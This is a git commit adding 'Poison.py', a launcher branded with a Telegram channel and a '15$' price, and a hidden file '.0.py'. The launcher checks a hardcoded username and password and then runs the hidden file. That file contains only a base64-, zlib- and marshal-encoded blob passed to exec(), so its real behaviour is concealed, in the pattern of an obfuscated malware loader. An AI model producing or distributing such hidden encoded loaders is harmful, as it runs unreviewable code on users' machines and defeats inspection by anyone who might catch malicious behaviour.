4146bebb16c2c55690498a10191faf2949aaf337
Lawa <106387121+s1mrx@users.noreply.github.com>
2023-01-28 16:12:46 +0300

    Add files via upload

---
+++ .0.py
@@ -0,0 +1,4 @@
+#Author : Lawa
+#Github : https://github.com/s1mrx
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJxNUMFOwzAMddJu4sAuO3DucReaicskhCa+ACFx64216ZqpaUrtSuuFCx8OTpqN2bH1/JznRC4hmuR45cBvThUfAS1AccUCCnHBEgp5wQkUCWiAUwqVhB8B4lYcG0loxCK9LRZzIeDECFgs4GOz5C+YX7Y3WjAsW/054IrRYLPHoc7enUHXoWLmaCgrW9fprCHq8VkpZprxkJfOqu1utz3PpqLmgTX9RI3rnuIYldd1nfdTeJX8GhxS4jcxIaWeM1bTnX9df40aCWkZu9qGC/psaON3+J/Qz6mOQfZiXTW2ei88v+Z0L2ZfSY7gfzmATnM="))))
---
+++ Poison.py
@@ -0,0 +1,21 @@
+import  os, sys, time
+os.system("clear")
+time.sleep(2)
+os.system("figlet Poison")
+print("\033[31m\n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n \033[0;1m     Author: Lawa - S1MRX\n      Telegram Channel: S1mrx_Coder\n      Telegram Group: S1mrx_Coder_Group\n      Note: 15$ \n      Note: Your ID Is Activated \n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+while True:
+	j = "Lawa"
+	h = "Poison"
+	jj = input("  Username: ")
+	hh = input("  Passowrd: ")
+	if h == hh and j == jj :
+		print("\033[32m Correct \033[0;1m:)")
+		print(50*"-")
+		time.sleep(1)
+		os.system("python2 .0.py")
+	else:
+		print("\033[33;1mWrong :(")
+		time.sleep(1)
+		os.system("clear")
+		os.system("figlet Poison")
+		print("\033[31m\n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n \033[0;1m     Author: Lawa - S1MRX\n      Admin: Mama\n      Telegram Channel: S1mrx_Coder\n      Telegram Group: S1mrx_Coder_Group\n      Note: 15$\n      Note: Your ID Is Activated \n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
